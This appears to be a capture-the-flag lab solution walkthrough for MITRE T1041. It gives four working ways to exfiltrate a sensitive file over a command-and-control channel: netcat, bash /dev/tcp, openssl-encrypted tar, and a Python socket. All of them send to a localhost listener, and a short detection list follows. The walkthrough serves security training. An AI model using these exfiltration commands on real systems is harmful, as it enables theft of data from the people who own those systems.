# T1041 – Exfiltration Over C2 Channel | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1041

## Method 1 – Netcat Pipe (Classic)
```bash
# Terminal 1 (C2 listener):
nc -lvnp 4444
# Terminal 2 (compromised host):
cat /opt/sensitive-data/flag.txt | nc localhost 4444
# C2 receives: HACKTIFY{C2_CHANNEL_EXFIL_<hash>}
```

## Method 2 – /dev/tcp (No netcat needed)
```bash
# Bash built-in TCP redirect:
cat /opt/sensitive-data/flag.txt > /dev/tcp/localhost/4444
# OR multi-line:
exec 3>/dev/tcp/localhost/4444
cat /opt/sensitive-data/flag.txt >&3
exec 3>&-
```

## Method 3 – Compressed + Encrypted Exfil
```bash
# Compress and encrypt before sending:
tar czf - /opt/sensitive-data/ | openssl enc -aes-256-cbc -k secretkey | nc localhost 4444
# Receiver decrypts:
nc -lvnp 4444 | openssl enc -d -aes-256-cbc -k secretkey | tar xzf -
```

## Method 4 – Python Socket C2
```python
import socket, subprocess
s = socket.socket()
s.connect(('localhost', 4444))
data = open('/opt/sensitive-data/flag.txt').read()
s.send(data.encode())
s.close()
```

## Detection
- Monitor outbound connections to unusual ports/IPs
- Alert on `nc` / `bash -i` / `/dev/tcp` in process args
- Network baseline: alert on new outbound connections from servers
